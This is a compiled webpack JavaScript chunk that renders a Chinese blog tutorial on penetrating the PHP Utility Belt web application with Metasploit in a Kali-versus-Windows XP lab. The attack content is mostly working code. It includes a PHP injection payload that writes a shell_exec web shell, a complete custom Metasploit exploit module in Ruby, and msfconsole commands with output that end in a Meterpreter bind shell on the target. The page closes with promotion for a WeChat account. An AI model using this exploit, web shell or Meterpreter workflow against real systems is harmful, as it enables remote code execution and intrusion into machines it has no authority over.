(window.webpackJsonp=window.webpackJsonp||[]).push([[318],{612:function(s,t,n){"use strict";n.r(t);var a=n(7),e=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"metasploit渗透php-utility-belt程序"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit渗透php-utility-belt程序"}},[s._v("#")]),s._v(" Metasploit渗透php-utility-belt程序")]),s._v(" "),t("p",[s._v("攻击机 kali 192.168.109.137")]),s._v(" "),t("p",[s._v("靶机：Win XP 192.168.109.141")]),s._v(" "),t("p",[s._v("应用程序 php-utility-belt (可以到链接：https://download.csdn.net/download/l1028386804/10923054 下载)")]),s._v(" "),t("h2",{attrs:{id:"部署php-utility-belt"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#部署php-utility-belt"}},[s._v("#")]),s._v(" 部署php-utility-belt")]),s._v(" "),t("p",[s._v("由于php-utility-belt是php程序，所以我们需要安装php环境,这里我为了简单直接安装了wamp环境。")]),s._v(" "),t("p",[s._v("将php-utility-belt解压后放在wamp的www目录下，")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160010746.png",loading:"lazy"}})]),s._v(" "),t("p",[s._v("同时在浏览器中访问链接：http://192.168.109.141/php-utility-belt/")]),s._v(" "),t("p",[s._v("如下图所示：")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160027242.png",loading:"lazy"}})]),s._v(" "),t("p",[s._v("显示这个页面就证明我们部署成功了。")]),s._v(" "),t("h2",{attrs:{id:"构造并提交攻击脚本"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#构造并提交攻击脚本"}},[s._v("#")]),s._v(" 构造并提交攻击脚本")]),s._v(" "),t("p",[s._v("我们文本框中输入如下代码：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("fwrite(fopen('info.php','w'), '<?php $a = \"net user\"; echo shell_exec($a);?>');\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("并点击Run按钮")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160107698.png",loading:"lazy"}})]),s._v(" "),t("h2",{attrs:{id:"查看php-utility-belt下的文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看php-utility-belt下的文件"}},[s._v("#")]),s._v(" 查看php-utility-belt下的文件")]),s._v(" "),t("p",[s._v("此时，我们发现php-utility-belt下多了一个info.php文件")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160129303.png",loading:"lazy"}})]),s._v(" "),t("p",[s._v("我们查看这个文件的内容：")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160142397.png",loading:"lazy"}})]),s._v(" "),t("h2",{attrs:{id:"访问info-php"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#访问info-php"}},[s._v("#")]),s._v(" 访问info.php")]),s._v(" "),t("p",[s._v("我们在浏览器中输入：http://192.168.109.141/php-utility-belt/info.php 访问info.php。")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160203928.png",loading:"lazy"}})]),s._v(" "),t("p",[s._v("这里，会显示靶机上的所有用户，说明php-utility-belt存在漏洞。")]),s._v(" "),t("h2",{attrs:{id:"进一步分析php-utility-belt的漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#进一步分析php-utility-belt的漏洞"}},[s._v("#")]),s._v(" 进一步分析php-utility-belt的漏洞")]),s._v(" "),t("p",[s._v("在google或firefox浏览器按下F12键，通过对网页代码的分析，文本框中的数据是通过参数code进行post提交的。")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117160230265.png",loading:"lazy"}})]),s._v(" "),t("h2",{attrs:{id:"编写攻击脚本php-utility-belt-attack-by-binghe-rb"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#编写攻击脚本php-utility-belt-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 编写攻击脚本php_utility_belt_attack_by_binghe.rb")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("##\n# Author 冰河\n# Date 2019-01-17\n# Description Metasploit渗透 php utility belt\n##\n\nrequire 'msf/core'\n\nclass Metasploit4 < Msf::Exploit::Remote\n  include Msf:: Exploit::Remote::HttpClient\n  \n  def initialize(info = {})\n    super(update_info(info,\n      'Name'              => 'PHP Utility Belt Remote Code Execution',\n      'Description'       => %q{\n          This module exploits a remote code execution vulnerability in P\n        },\n       'Author'           =>\n        [\n          'binghe'\n        ],\n       \n       'DisclosureDate'   => '2019-01-17',\n       'Platform'         => 'php',\n       'Payload'          =>\n        {\n          'Space'         => 2000,\n          # 现在的漏洞在一个Web应用程序中，而不是在软件程序中，所以要将DisableNops的值设置为true以关闭攻击载荷中的NOP\n          'DisableNops'   => true   \n        },\n       \n       'Targets'          =>\n        [\n          ['PHP Utility Belt', {}]\n        ],\n       'DefaultTarget'   => 0))\n    \n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php']),\n        OptString.new('CHECKURI', [false, 'Checking Perpose', '/php-utility-belt/info.php']),\n      ], self.class) \n    end\n    \n    def check\n      send_request_cgi(\n          'method'        => 'POST',\n          'uri'           => normalize_uri(target_uri.path),\n          'vars_post'     => {\n              'code'      => \"fwrite(fopen('info.php','w'), '<?php echo phpinfo();?>');\"\n            }\n      )   \n    resp = send_request_raw({'uri'  => normalize_uri(datastore['CHECKURI']), 'method' => 'GET'})\n    if resp.body = ~/phpinfo()/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n   end\n   \n   def exploit\n    send_request_cgi(\n      'method'        => 'POST',\n      'uri'           => normalize_uri(target_uri.path),\n      'vars_post'     => {\n        'code'        => payload.encoded\n      }\n    )\n   end\n   \nend\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br"),t("span",{staticClass:"line-number"},[s._v("46")]),t("br"),t("span",{staticClass:"line-number"},[s._v("47")]),t("br"),t("span",{staticClass:"line-number"},[s._v("48")]),t("br"),t("span",{staticClass:"line-number"},[s._v("49")]),t("br"),t("span",{staticClass:"line-number"},[s._v("50")]),t("br"),t("span",{staticClass:"line-number"},[s._v("51")]),t("br"),t("span",{staticClass:"line-number"},[s._v("52")]),t("br"),t("span",{staticClass:"line-number"},[s._v("53")]),t("br"),t("span",{staticClass:"line-number"},[s._v("54")]),t("br"),t("span",{staticClass:"line-number"},[s._v("55")]),t("br"),t("span",{staticClass:"line-number"},[s._v("56")]),t("br"),t("span",{staticClass:"line-number"},[s._v("57")]),t("br"),t("span",{staticClass:"line-number"},[s._v("58")]),t("br"),t("span",{staticClass:"line-number"},[s._v("59")]),t("br"),t("span",{staticClass:"line-number"},[s._v("60")]),t("br"),t("span",{staticClass:"line-number"},[s._v("61")]),t("br"),t("span",{staticClass:"line-number"},[s._v("62")]),t("br"),t("span",{staticClass:"line-number"},[s._v("63")]),t("br"),t("span",{staticClass:"line-number"},[s._v("64")]),t("br"),t("span",{staticClass:"line-number"},[s._v("65")]),t("br"),t("span",{staticClass:"line-number"},[s._v("66")]),t("br"),t("span",{staticClass:"line-number"},[s._v("67")]),t("br"),t("span",{staticClass:"line-number"},[s._v("68")]),t("br"),t("span",{staticClass:"line-number"},[s._v("69")]),t("br"),t("span",{staticClass:"line-number"},[s._v("70")]),t("br"),t("span",{staticClass:"line-number"},[s._v("71")]),t("br")])]),t("h2",{attrs:{id:"上传攻击脚本php-utility-belt-attack-by-binghe-rb"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#上传攻击脚本php-utility-belt-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 上传攻击脚本php_utility_belt_attack_by_binghe.rb")]),s._v(" "),t("p",[s._v("将攻击脚本php_utility_belt_attack_by_binghe.rb上传的Kali的/usr/share/metasploit-framework/modules/exploits/web/php目录下。")]),s._v(" "),t("h2",{attrs:{id:"运行攻击脚本php-utility-belt-attack-by-binghe-rb"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#运行攻击脚本php-utility-belt-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 运行攻击脚本php_utility_belt_attack_by_binghe.rb")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("msfconsole\nuse exploit/web/php/php_utility_belt_attack_by_binghe \nset payload php/meterpreter/bind_tcp\nset RHOST 192.168.109.141\nshow options\nexploit\nsysinfo\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("p",[s._v("具体操作效果如下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("msf > use exploit/web/php/php_utility_belt_attack_by_binghe \nmsf exploit(web/php/php_utility_belt_attack_by_binghe) > set payload php/meterpreter/bind_tcp\npayload => php/meterpreter/bind_tcp\nmsf exploit(web/php/php_utility_belt_attack_by_binghe) > set RHOST 192.168.109.141\nRHOST => 192.168.109.141\nmsf exploit(web/php/php_utility_belt_attack_by_binghe) > show options\n\nModule options (exploit/web/php/php_utility_belt_attack_by_binghe):\n\n   Name       Current Setting             Required  Description\n   ----       ---------------             --------  -----------\n   CHECKURI   /php-utility-belt/info.php  no        Checking Perpose\n   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST      192.168.109.141             yes       The target address\n   RPORT      80                          yes       The target port (TCP)\n   SSL        false                       no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /php-utility-belt/ajax.php  yes       The path to PHP Utility Belt\n   VHOST                                  no        HTTP server virtual host\n\n\nPayload options (php/meterpreter/bind_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LPORT  4444             yes       The listen port\n   RHOST  192.168.109.141  no        The target address\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   PHP Utility Belt\n\n\nmsf exploit(web/php/php_utility_belt_attack_by_binghe) > exploit\n\n[*] Started bind TCP handler against 192.168.109.141:4444\n[*] Sending stage (38247 bytes) to 192.168.109.141\n\nmeterpreter > sysinfo\nComputer    : LIUYAZHUANG\nOS          : Windows NT LIUYAZHUANG 5.1 build 2600 (Windows XP Professional Service Pack 3) i586\nMeterpreter : php/windows\nmeterpreter > \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br")])]),t("p",[s._v("到此，我们已经拿到了靶机的Shell，后续就可以进行各种渗透操作了。")]),s._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=e.exports}}]);